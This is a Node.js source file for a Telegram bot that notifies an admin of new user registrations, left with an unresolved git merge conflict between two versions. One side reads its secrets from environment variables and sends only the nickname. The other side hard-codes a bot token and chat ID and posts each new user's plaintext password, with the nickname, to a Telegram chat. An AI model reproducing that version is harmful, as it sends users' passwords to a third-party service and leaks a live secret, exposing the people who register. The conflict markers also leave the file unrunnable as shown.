const TelegramBot = require('node-telegram-bot-api');

<<<<<<< HEAD
// Configure these values with environment variables. Never send passwords to chat.
const TOKEN = process.env.REGISTER_BOT_TOKEN;
const ADMIN_CHAT = process.env.ADMIN_CHAT_ID;
const bot = TOKEN ? new TelegramBot(TOKEN, { polling: false }) : null;

async function notifyNewUser(nickname) {
  if (!bot || !ADMIN_CHAT) return;
  try {
    await bot.sendMessage(ADMIN_CHAT, `Новая регистрация: ${String(nickname).slice(0, 64)}`);
  } catch (e) {
    console.error('Ошибка уведомления о регистрации:', e.message);
  }
}

module.exports = { notifyNewUser };
=======
// ВСТАВЬ СЮДА ТОКЕН ТВОЕГО НОВОГО БОТА ДЛЯ РЕГИСТРАЦИЙ
const TOKEN = '9254875275:AAE1A1cel0QrUjp4IJABNd2YQB6XhENviM4'; 
const ADMIN_CHAT = '7270019395';

// Создаем бота БЕЗ прокси (он пойдет через твой системный VPN)
const bot = new TelegramBot(TOKEN, { polling: false });

async function notifyNewUser(nickname, password) {
  const text = `🆕 *Новая регистрация!*\n\n👤 Ник: \`${nickname}\`\n🔑 Пароль: \`${password}\``;
  try {
    await bot.sendMessage(ADMIN_CHAT, text, { parse_mode: 'Markdown' });
    console.log('✅ Уведомление о регистрации отправлено!');
  } catch (e) {
    console.error('❌ Ошибка отправки регистрации:', e.message);
  }
}

module.exports = { notifyNewUser };
>>>>>>> d1a282aa43b0806de8c8f09c7d21ae91c9e23df8
